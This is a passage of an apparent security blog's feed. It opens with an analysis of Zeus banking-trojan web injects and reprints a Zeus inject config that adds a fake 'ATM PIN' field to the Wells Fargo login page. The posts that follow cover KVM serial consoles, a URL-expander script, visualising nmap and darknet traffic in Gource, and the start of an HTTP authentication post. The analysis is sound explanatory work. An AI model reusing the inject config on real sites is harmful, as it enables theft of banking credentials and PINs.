<p>When looking at the web injects, I guess the simplest way to describe them is similar to your favorite text editors search and replace features. With the Zeus bot hooked into some low level network API&rsquo;s in Windows, it is able to monitor for its configured URL&rsquo;s, and inject arbitrary content into the responses that are displayed in your browser. Lets take an example from the source <a href="https://github.com/Visgean/Zeus/blob/translation/output/builder/webinjects.txt#L63">here</a>.</p>

<figure class='code'><figcaption><span>Wellsfargo Web Inject</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>set_url https://www.wellsfargo.com/* G
</span><span class='line'>data_before
</span><span class='line'><span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">&quot;mozcloak&quot;</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span><span class="err">*&lt;/</span><span class="na">span</span><span class="nt">&gt;</span>
</span><span class='line'>data_end
</span><span class='line'>data_inject
</span><span class='line'><span class="nt">&lt;br&gt;&lt;strong&gt;&lt;label</span> <span class="na">for=</span><span class="s">&quot;atmpin&quot;</span><span class="nt">&gt;</span>ATM PIN<span class="nt">&lt;/label&gt;</span>:<span class="nt">&lt;/strong&gt;</span><span class="ni">&amp;nbsp;</span><span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">&quot;mozcloak&quot;</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span> <span class="na">accesskey=</span><span class="s">&quot;A&quot;</span> <span class="na">id=</span><span class="s">&quot;atmpin&quot;</span> <span class="na">name=</span><span class="s">&quot;USpass&quot;</span> <span class="na">size=</span><span class="s">&quot;13&quot;</span> <span class="na">maxlength=</span><span class="s">&quot;14&quot;</span> <span class="na">style=</span><span class="s">&quot;width:147px&quot;</span> <span class="na">tabindex=</span><span class="s">&quot;2&quot;</span> <span class="nt">/&gt;&lt;/span&gt;</span>
</span><span class='line'>data_end
</span><span class='line'>data_after
</span><span class='line'>data_end
</span></code></pre></td></tr></table></div></figure>


<p>In the above extract from the web injects we can see that the http<strong>s</strong>://wellsfargo.com (note the s) website will have a extra field added, asking for a <em>ATM PIN</em> before the password field. Now, an important thing to note here. Yes, a website owner could change the web sources which will make this web inject not work, however, the POST data will still be recorded for this watched URL and eventually stored on the C&amp;C.</p>

<p><img src="http://npercoco.typepad.com/.a/6a0133f264aa62970b01910426b229970c-pi"></p>

<h3>Summary</h3>

<p>While Zeus itself is old news and many variants such as <a href="http://www.mcafee.com/us/resources/white-papers/wp-citadel-trojan.pdf">Citadel</a> have sprung up, I believe this is still a very valid threat as the concepts remain the same.</p>

<p>A interesting thing about the bot. Zeus, once it infects a PC, will delete all the cookies in Internet Explorer. This is to force the user to re-login to the services he uses, and also lets Zeus grab them :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[KVM - Redirecting CentOS Kernel and tty output to a virtual serial console]]></title>
    <link href="http://leonjza.github.io/blog/2013/08/03/kvm-redirecting-centos-kernel-and-tty-output-to-a-virtual-serial-console/"/>
    <updated>2013-08-03T08:27:00+02:00</updated>
    <id>http://leonjza.github.io/blog/2013/08/03/kvm-redirecting-centos-kernel-and-tty-output-to-a-virtual-serial-console</id>
    <content type="html"><![CDATA[<h3>Console all the things!</h3>

<p>First and foremost, I will start with a warning. Like any other virtualization software, you risk leaving the console open. This is a often overlooked part of securing your infrastructure. An administrator may have been required to do some work on the virtual console, and forget to log out. What if that account that is still logged in, is r00t? Having administrative access to a VM Host gives you access to the consoles, but not necessarily to the guests. Remember to log out! Or, setup shells to auto-logout after a few minutes of inactivity.</p>

<!--more-->


<h3>Example virsh console access</h3>

<p>Once setup, accessing consoles can be as easy as connecting via SSH to your server. Firing up the virsh client, and connecting to the console:</p>

<figure class='code'><figcaption><span>a primitive virsh console access example</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>virsh --connect qemu:///system
</span><span class='line'>Welcome to virsh, the virtualization interactive terminal.
</span><span class='line'>
</span><span class='line'>Type:  <span class="s1">&#39;help&#39;</span> <span class="k">for </span><span class="nb">help </span>with commands
</span><span class='line'>       <span class="s1">&#39;quit&#39;</span> to quit
</span><span class='line'>
</span><span class='line'> Id    Name                           State
</span><span class='line'>----------------------------------------------------
</span><span class='line'> 6     console-test                   running
</span><span class='line'>
</span><span class='line'>virsh <span class="c"># console console-test</span>
</span><span class='line'>Connected to domain console-test
</span><span class='line'>Escape character is ^<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>CentOS release 6.4 <span class="o">(</span>Final<span class="o">)</span>
</span><span class='line'>Kernel 2.6.32-358.el6.x86_64 on an x86_64
</span><span class='line'>
</span><span class='line'>localhost.localdomain login: root
</span><span class='line'>Password:
</span><span class='line'>Last login: Sat Aug  3 08:31:13 on ttyS0
</span><span class='line'><span class="o">[</span>root@localhost ~<span class="o">]</span><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can escape the console by pressing <code>^]</code>, which will drop you back into the virsh shell.</p>

<figure class='code'><figcaption><span>virsh guest console escape</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>root@localhost ~<span class="o">]</span><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">&quot;testing123&quot;</span>
</span><span class='line'>testing123
</span><span class='line'><span class="o">[</span>root@localhost ~<span class="o">]</span><span class="nv">$ </span>                      <span class="c"># I pressed ^] here  </span>
</span><span class='line'>virsh <span class="c">#</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Ok, gimme ze commands already&hellip;</h3>

<p>This I have tested on CentOS 6.4. The 2 commands to get it setup would be:</p>

<figure class='code'><figcaption><span>Enabling KVM Console access</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>cat &gt; /etc/init/ttyS0.conf <span class="s">&lt;&lt; EOL</span>
</span><span class='line'><span class="s"># ttyS0 - agetty</span>
</span><span class='line'><span class="s">#</span>
</span><span class='line'><span class="s"># This service maintains a agetty on ttyS0.</span>
</span><span class='line'>
</span><span class='line'><span class="s">stop on runlevel [S016]</span>
</span><span class='line'><span class="s">start on runlevel [23]</span>
</span><span class='line'>
</span><span class='line'><span class="s">respawn</span>
</span><span class='line'><span class="s">exec agetty -h -L -w /dev/ttyS0 115200 vt102</span>
</span><span class='line'><span class="s">EOL</span>
</span><span class='line'><span class="nv">$ </span>grubby --update-kernel<span class="o">=</span>ALL --args<span class="o">=</span><span class="s1">&#39;console=ttyS0,115200n8 console=tty0&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, you can reboot the server and connect to the domains console via virsh. If all went well, you <em>should</em> be seeing kernel messages and eventually service starts up&rsquo;s, followed by a login prompt in the console.</p>

<p>If rebooting is not a option, you can enable it on the fly, after saving <code>ttyS0.conf</code> with <code>$ initctl start ttyS0</code> as root.</p>

<p>The <code>grubby</code> command is not mandatory, however this is what allows you to see the kernel messages as the guest boots. I <strong>highly</strong> recommend it.</p>

<h3>I have console, but can&rsquo;t log in as root</h3>

<p>If you followed this guide, then that would in fact be the case. Logging in directly as root is not something I would recommend. Rather log in as a unprivileged user, and su/sudo up to root. In some cases however it is actually necessary. So, to fix this problem, simply add <code>ttyS0</code> as a &ldquo;securetty&rdquo; in <code>/etc/securetty</code> by running: <code>$ echo "ttyS0" &gt;&gt; /etc/securetty</code>. This will allow root logins via the virsh console.</p>

<h3>serial.conf has the answers</h3>

<p>If you are looking for more in-depth explanations as to how this works, I suggest you take a look at <code>/etc/init/serial.conf</code> (again on CentOS 6.4). You&rsquo;ll notice the configuration for <code>ttyS0.conf</code> also comes from here :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[URL Expansion - I'm paranoid like that]]></title>
    <link href="http://leonjza.github.io/blog/2013/07/31/url-expansion-im-paranoid-like-that/"/>
    <updated>2013-07-31T18:19:00+02:00</updated>
    <id>http://leonjza.github.io/blog/2013/07/31/url-expansion-im-paranoid-like-that</id>
    <content type="html"><![CDATA[<h3>So there is a good use</h3>

<p>URL Shorteners, as they are most commonly known, are pretty useful in places where you are limited to the amount of characters you are allowed to type. Twitter being the prime example. However, it is not only because of services like that that these URL shortening services exist. Sometimes, URL&rsquo;s are are just plain crazy long, and very error prone when you have to copy and paste/link them someone. I guess we can call this a useful feature?</p>

<!--more-->


<h3>And a bad use</h3>

<p>Of course, like most of the stuff you find on the internet, there has to be a way to abuse it too. Many people that consider themselves to be &ldquo;IT Literate&rdquo;, be it second nature, or they have been burned before, will usually check out the link they are about to click. URL Shortening services take this &ldquo;check&rdquo; right out. It is now easier to get someone to click on a url to <em>somedodywebsite.io/free_trojan_screensaver_no_virus_promise.exe</em> as by the time the page has loaded, it may very well be too late.</p>

<p>There are also concerns about tracking too. But that is a different debate all together.</p>

<h3>Rise of the URL Expander.</h3>

<p>There are tons, and I mean, <strong>tons</strong> of &lsquo;URL Expansion&rsquo; services available online. <a href="http://longurl.org/,">http://longurl.org/,</a> <a href="http://urlex.org/">http://urlex.org/</a> and <a href="http://www.wheredoesthislinkgo.com/">http://www.wheredoesthislinkgo.com/</a> to name a few. All from a simple Google Search. There are even browser plugins that would automatically &lsquo;expand&rsquo; urls  as you hover over them.</p>

<p>This is cool and all. But how do I know that those services are not modifying the URL&rsquo;s? How do I know the browser plugin is not also fooling around somehow? Does that sound pretty paranoid to you? Well&hellip; :D</p>

<h3>Time for longurl.py</h3>

<p>I wanted something to use on the command line, that would allow me to see <strong>exactly</strong> where I was going. Thus, <em>longurl.py</em> came to be.</p>

<p>Get the script with: <code>$ git clone https://github.com/th3l33k/longurl.git</code></p>

<p>With this, I am able to see each 30x type redirect, as well as where it will take me. A sample usage case would be:</p>

<figure class='code'><figcaption><span>longurl.py Usage</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>% ./longurl.py http://t.co/CHwi0q7DyF
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Next stop: <span class="s1">&#39;http://t.co/CHwi0q7DyF&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Got status: 301 with reason: Moved Permanently
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Next stop: <span class="s1">&#39;http://bit.ly/14hneHx&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Got status: 301 with reason: Moved
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Next stop: <span class="s1">&#39;http://t.co/lqyFnSivpw&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Got status: 301 with reason: Moved Permanently
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Next stop: <span class="s1">&#39;http://reg.cx/27nM&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Got status: 302 with reason: Found
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Next stop: <span class="s1">&#39;http://www.theregister.co.uk/2013/07/31/department_defence_no_lenovo_ban/&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Got status: 200 with reason: OK
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> The final looks to be: <span class="s1">&#39;http://www.theregister.co.uk/2013/07/31/department_defence_no_lenovo_ban/&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now you can see each &lsquo;hop&rsquo; it would have taken, as well as have your &lsquo;check before click&rsquo; ability back. Like I said, there are lots of other ways to get the same thing done, but I preferred knowing exactly what is going on, rather than just getting the final URL, missing potential bad URL&rsquo;s in between that could lead to other <em>interesting</em> finding. :)</p>

<p><strong>EDIT</strong>
A similar effect can be seen with this one curl command:</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA['stuff' to Gource.]]></title>
    <link href="http://leonjza.github.io/blog/2013/07/27/stuff-to-gource/"/>
    <updated>2013-07-27T14:09:00+02:00</updated>
    <id>http://leonjza.github.io/blog/2013/07/27/stuff-to-gource</id>
    <content type="html"><![CDATA[<h3>Stuff to what&hellip;?</h3>

<p>Not too long ago, a colleague introduced me to Gource. In case you have not heard of <a href="https://code.google.com/p/gource/">Gource</a> before, I highly suggest you take a few minutes and check out the project home page <a href="https://code.google.com/p/gource/">here</a>. If you have been developing, or are part of a development project that has been around a while, then Gource should be able to tell you a tale in a strangely mesmerising way about its progression. Go ahead, download and install it. You are going to need it to try the rest of the stuff anyways.</p>

<p><em>Be warned though, watching the output is highly addictive and strangely entertaining, so if you value your productivity, <strong>don&rsquo;t</strong> continue reading this post.</em></p>

<p><img src="http://i.imgur.com/gFkD3z5.png"></p>

<!--more-->


<p>In short, Gource will take your repos commit logs from Git, Mecurial, SVN or even CVS (with some work) and splash out a graphical representation of the commits, by committer, across time. It also has a number of tweaks that allows you to change some visuals, focus on specific comitters and add titles etc.</p>

<p>You can also create a Gource &lsquo;movie&rsquo; by specifying the <code>-o</code> option for output. This will provide a sequence of screenshots in PPM format that can later be encoded using something like FFMPEG. Keep in mind that this output is <em>massive</em>. 5mins of output generated something like a 5GB .ppm file for me. You can also just pipe your Gource output directly into ffmpeg, skipping the need to create the .ppm as FFMPEG can read a stream. I of course have no idea how you&rsquo;d accomplish this in Windows, but ok ;D</p>

<p>Majong released a video of exactly this for the Minecraft dev tree. 800+ days worth of work, depicting the commit logs from a alpha 1.2 version through to the 1.5 release bought down 8 minutes. <a href="http://www.youtube.com/watch?v=zRjTyRly5WA">Direct Link</a></p>

<h3>Taking it one step further.</h3>

<p>So all this is cool and stuff. Watching the stories of code get told in a uber cool fashion, causing a lot of productive time to be lost. However, browsing through the Gource Wiki Pages, revealed a rather interesting section. Gource accepts a argument called <code>--log-format custom</code> that allows you to generate, well, custom logs.</p>

<p>According to the <a href="https://code.google.com/p/gource/wiki/CustomLogFormat">wiki documentation</a>, the format for a custom log entry needs to be pipe delimited and have the following format:</p>

<figure class='code'><figcaption><span>Gource sample custom log</span><a href='https://code.google.com/p/gource/wiki/CustomLogFormat'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># minimum custom log format</span>
</span><span class='line'>1275543595<span class="p">|</span>andrew<span class="p">|</span>A<span class="p">|</span>src/main.cpp
</span><span class='line'><span class="c"># optionally, we can set a color value</span>
</span><span class='line'>1275543595<span class="p">|</span>andrew<span class="p">|</span>A<span class="p">|</span>src/main.cpp<span class="p">|</span>FF0000
</span></code></pre></td></tr></table></div></figure>


<p>So this is, nice. Gource <em>also</em> accepts input from stdin, via <code>-</code> as input obviously. To sum this up. Any, correctly formatted, pipe delimited input can be accepted as a &lsquo;log&rsquo; entry, that Gource should understand. Lets try it out.</p>

<h3>Introducing py2gource.py</h3>

<p>My initial thought on this was that 90% if the custom log formats could be generated on the shell. Rightfully so. With tools like <strong>awk</strong> and <strong>sed</strong>, you can do some pretty neat stuff. However, as powerful as they may be, the approach of writing some middleware that would do all of the parsing and log generation <em>for</em> me, seemed like a better idea. And so, <code>py2gource.py</code> was born. Another terribly coded piece of python to do things I am too lazy to do in any other way.</p>

<p>So far based on what has been coded, the basic idea to use this middleware in a very simple form is: <code>cat something | python py2gource.py | gource</code></p>

<h3>Gource for&hellip; Nmap?</h3>

<p>But, we don&rsquo;t have to <code>cat</code> something for output, right. Just do <code>nmap 127.0.0.1 -v | python py2gource.py | gource</code>. <code>py2gource.py</code> will happily read <em>stdin</em> and parse the output for input formats it understands, specified by <code>-t</code> as needed. For example:</p>

<figure class='code'><figcaption><span>Parsed Nmap Output</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Nmap output before its parsed by py2gource.py</span>
</span><span class='line'><span class="nv">$ </span>nmap 127.0.0.1 -v
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.25 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2013-07-25 19:58 SAST
</span><span class='line'>Initiating Ping Scan at 19:58
</span><span class='line'>Scanning 127.0.0.1 <span class="o">[</span>2 ports<span class="o">]</span>
</span><span class='line'>Completed Ping Scan at 19:58, 0.00s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
</span><span class='line'>Initiating Connect Scan at 19:58
</span><span class='line'>Scanning localhost <span class="o">(</span>127.0.0.1<span class="o">)</span> <span class="o">[</span>1000 ports<span class="o">]</span>
</span><span class='line'>Discovered open port 8080/tcp on 127.0.0.1
</span><span class='line'>Discovered open port 22/tcp on 127.0.0.1
</span><span class='line'>Discovered open port 80/tcp on 127.0.0.1
</span><span class='line'>Discovered open port 3306/tcp on 127.0.0.1
</span><span class='line'>Discovered open port 5222/tcp on 127.0.0.1
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="c"># now, parsed by py2gource.py</span>
</span><span class='line'><span class="nv">$ </span>nmap 127.0.0.1 -v <span class="p">|</span> python py2gource.py -t nmap
</span><span class='line'>
</span><span class='line'>1374774922<span class="p">|</span>nmap<span class="p">|</span>A<span class="p">|</span>127.0.0.1/tcp/8080<span class="p">|</span>9C9841
</span><span class='line'>1374774922<span class="p">|</span>nmap<span class="p">|</span>A<span class="p">|</span>127.0.0.1/tcp/22<span class="p">|</span>9C9841
</span><span class='line'>1374774922<span class="p">|</span>nmap<span class="p">|</span>A<span class="p">|</span>127.0.0.1/tcp/80<span class="p">|</span>9C9841
</span><span class='line'>1374774922<span class="p">|</span>nmap<span class="p">|</span>A<span class="p">|</span>127.0.0.1/tcp/3306<span class="p">|</span>9C9841
</span><span class='line'>1374774923<span class="p">|</span>nmap<span class="p">|</span>A<span class="p">|</span>127.0.0.1/tcp/4000<span class="p">|</span>9C9841
</span></code></pre></td></tr></table></div></figure>


<p>From the above example we can see that the verbose Nmap output has been parsed to be complaint to the custom log format as per the Gource wiki. So, lets pipe this to gource:</p>

<figure class='code'><figcaption><span>Nmap to gource</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nmap -v 192.168.137.0/24 <span class="p">|</span> python py2gource.py -t nmap <span class="p">|</span> gource --realtime --log-format custom - -1440x900 --bloom-intensity 0.3 -e 0.2 -i 120 --title <span class="s2">&quot;Nmap of 192.168.137.0/24&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>You should now have a Gource window pop up, with your Nmap results being displayed in a similar fashion as you saw in the Minecraft example. The above command completes the 3 parts required to get output to Gource using the middleware. Granted in the Nmap case, the parser will just not output anything if the IP or IP range that you are scanning has no open ports, or, you forgot to specify the <code>-v</code> argument. <em>This requirement may change later</em>.</p>

<p>Seeing the Nmap scan come alive is pretty cool. It almost convinces one to scan all the things, just to watch the pretty pictures!</p>

<h3>Visualising a Network Telescope</h3>

<p>Where I am currently employed, I am fortunate enough to have access to the data our blackhole provides to us. The setup is pretty simple. There are 13, random /24&rsquo;s (IPV6 coming soon™), sink holed to a box running the <a href="http://qosient.com/argus/">Argus</a> server software. Argus provides a set of client tools that you can use to connect to the server and &lsquo;see&rsquo; what is happening, live.</p>

<p>This was a golden opportunity to add a parser that would parse the output this client receives into Gource. The result? See for yourself:</p>

<p><img src="http://i.imgur.com/eDc3EPlh.png"></p>

<p>Moments later, even more activity&hellip; :)</p>

<p><img src="http://i.imgur.com/yPAGoLwh.png"></p>

<p>The parser will take the Argus client output and split the results of the IPv4 destination address by octet. Each octet will form part of the tree structure. Each bubble represents a port that was touched. Finally, each full destination IP address will get its own <em>unique</em> colour, so it will be easy to see when a specific IP has been scanned across multiple ports. Each <em>user</em> is a source IP address. Remember, this is IP space that is used for nothing other than seeing what is happening on it. So things like people scanning your Darknet for open SSH ports will make your Gource go mad, in a good way ofc.</p>

<p>The above screenshots were taken by specifying the <code>--hide dirnames</code> arguments, as we obviously want to try and keep the IP space of the blackhole classified.</p>

<h3>Ok, how did you do THAT</h3>

<figure class='code'><figcaption><span>Visualising the Argus Darknet with Gource</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>~/Downloads/argus-clients-3.0.6.2/bin/ra -S <span class="o">[</span>argus_server<span class="o">]</span>:<span class="o">[</span>argus_port<span class="o">]</span> -n <span class="p">|</span> tee raw <span class="p">|</span> python py2gource.py -t argus <span class="p">|</span> tee parsed <span class="p">|</span> gource --realtime --log-format custom - -1440x900 --bloom-intensity 0.3 --title <span class="s2">&quot;Live Darknet Port Activity&quot;</span> -i 30 -f
</span></code></pre></td></tr></table></div></figure>


<p>I am going to assume you have the Argus server setup complete, and you are able to connect using the <code>ra</code> client. For more information on setting it up, refer to the Argus wiki <a href="http://nsmwiki.org/index.php?title=Argus">here</a>. Which ever machine your using to run Gource on, obviously needs to be able to connect as well.</p>

<p>The Argus parser works without specifying any fancy command line options. I have used <code>-n</code> in the example as I did not want to have the destination port names, but the raw port numbers instead. This output is piped into <code>tee</code>, that will write the output to the file <em>raw</em> as well as stdout. This is not a requirement, but its interesting to see <strong>what</strong> is being parsed. I tail the file in a separate terminal usually and inspect the output. Then the output is passed to <code>py2gource.py</code> with the type set to argus via <code>-t argus</code>. The output generated by this middleware is then finally &lsquo;tee&rsquo;d&rsquo; and sent to Gource, which is configured to accept input in realtime from stdin with <code>--realtime --log-format custom -</code>. The rest of the options I used in the example for Gource is purely graphically related.</p>

<p>The file <em>parsed</em> can be seen as a &lsquo;history&rsquo; file that can be piped into Gource again at a later time to replay potentially interesting events, or, if you are not able to connect directly to argus, and need to grab and parse output on one machine, and then replay on another machine with Gource installed.</p>

<h3>Get the code, setup your own.</h3>

<p>The parser&rsquo;s code is hosted on Github <a href="https://github.com/th3l33k/py2gource">here</a>. Grab the code with <code>git clone https://github.com/th3l33k/py2gource.git</code>. Parsers live in <code>lib/Parsers</code> if you are interested in parsing some other interesting information you may have.</p>

<p>Have fun! :D</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[dtob.py: Digest to Basic authentication; A simple example of a authentication 'downgrade' attack]]></title>
    <link href="http://leonjza.github.io/blog/2013/06/25/dtob-dot-py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack/"/>
    <updated>2013-06-25T18:52:00+02:00</updated>
    <id>http://leonjza.github.io/blog/2013/06/25/dtob-dot-py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack</id>
    <content type="html"><![CDATA[<h3>Introduction</h3>

<p>Lets start by saying that I am by <em>no</em> means an expert at any of what I am about to write. Primarily this post is purely for research purposes. Think of it as one of those <em>something to do</em> scenarios. I&rsquo;d like to cover some basics around HTTP Authentication, and then show a PoC of how this can be abused in a real world scenario. Hopefully this will help educate people to use more secure authentication mechanisms! :)</p>

<!--more-->


<h3>Authentication at a HTTP Level</h3>

<p>HTTP Level authentication, for the most part, rely on a set of headers to authenticate the user. Generally speaking, the server will present the expected authentication mechanism via a <code>WWW-Authenticate</code> header, and expect the client to prepare the correct response back. Each request the user makes after a successful authentication attempt, has to contain the correct headers for the applicable authentication scheme, else the server would normally respond with a <code>401 - Not Authorised</code>, and the client has to re-authenticate. It is up to the server/application to validate the headers on each request.
HTTP level authentication mechanisms include <a href="http://tools.ietf.org/html/rfc2617#section-2">Basic</a>, <a href="http://tools.ietf.org/html/rfc2617#section-3">Digest</a> as well as more complex schemes such as <a href="http://tools.ietf.org/html/rfc4559">Kerberos</a>, <a href="http://davenport.sourceforge.net/ntlm.html#ntlmHttpAuthentication">NTLM</a> and <a href="http://oauth.net/core/1.0/#auth_header">OAuth</a></p>

<p>It is important to note that even though you are using say, Digest authentication, it is entirely up to the backend systems to <strong>validate</strong> the credentials. Whether it is some backend database, RADIUS server, LDAP etc. that stores your valid set of credentials does not matter. The server and the client, on a HTTP level, will be exchanging these headers.</p>

<p>For the purpose of this article, I will focus a little on the arguably less complex mechanisms, Basic and Digest.</p>

<h3>HTTP Basic Authentication</h3>

<p>Basic authentication is considered the <em>least secure</em> method of HTTP authentication. Why is this exactly? Well, the credentials used to authenticate you as a user is sent over the wire in a Base64 encoded string. Base64 is a <strong>encoding</strong> scheme, and <strong>not</strong> an encryption scheme [<a href="http://en.wikipedia.org/wiki/Base64">1</a>].</p>

<p>To demonstrate this, lets assume we have a website that wants to make use of basic authentication. A sample request header would look like:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /auth/basic/ HTTP/1.1
</span><span class='line'>Host: test.dev
</span><span class='line'>Proxy-Connection: keep-alive
</span><span class='line'>Cache-Control: max-age=0
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span><span class='line'>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
</span><span class='line'>DNT: 1
</span><span class='line'>Accept-Encoding: gzip,deflate,sdch
</span><span class='line'>Accept-Language: en-US,en;q=0.8,af;q=0.6</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>The website, configured to use basic authentication, will see that there is no <code>Authorisation</code> header presented by the client, and respond with a <code>401</code>, as well as a <code>WWW-Authenticate</code> header.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>HTTP/1.0 401 Unauthorised
</span><span class='line'>Date: Tue, 25 Jun 2013 17:33:37 GMT
</span><span class='line'>Server: Apache/2.2.22 (Unix) DAV/2 PHP/5.3.15 with Suhosin-Patch mod_ssl/2.2.22 OpenSSL/0.9.8x
</span><span class='line'>X-Powered-By: PHP/5.3.15
</span><span class='line'>WWW-Authenticate: Basic realm="Basic Auth Testing"
</span><span class='line'>Content-Length: 39
</span><span class='line'>Connection: close
</span><span class='line'>Content-Type: text/html
</span><span class='line'>
</span><span class='line'>Text to send if user hits Cancel button</span></code></pre></td></tr></table></div></figure>


<p>The response we got when attempting to access the website told us that we need to provide a authentication response first. Based on the <code>WWW-Authenticate</code> header, this mechanism should be <code>Basic</code> for the realm <em>Basic Auth Testing</em>. Don&rsquo;t stress too much about the realm part. In short, this is usually used to give the user a short message like &ldquo;Restricted Area&rdquo; etc.
